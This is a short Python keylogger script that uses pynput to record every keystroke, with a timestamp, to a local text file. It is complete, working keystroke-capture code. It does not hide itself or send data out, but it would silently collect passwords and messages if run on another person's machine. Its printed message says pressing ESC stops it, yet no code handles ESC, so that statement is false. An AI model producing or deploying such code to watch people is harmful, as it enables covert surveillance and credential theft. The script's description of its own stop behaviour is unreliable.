from pynput import keyboard
from datetime import datetime

log_file = "key_log.txt"

def on_press(key):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    try:
        log_entry = f'{timestamp} - {key.char}\n'
    except AttributeError:
        # Handles special keys like space, enter, etc.
        log_entry = f'{timestamp} - [{key}]\n'

    with open(log_file, "a") as file:
        file.write(log_entry)

def main():
    print("Keylogger with timestamp is running... Press ESC to stop.")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
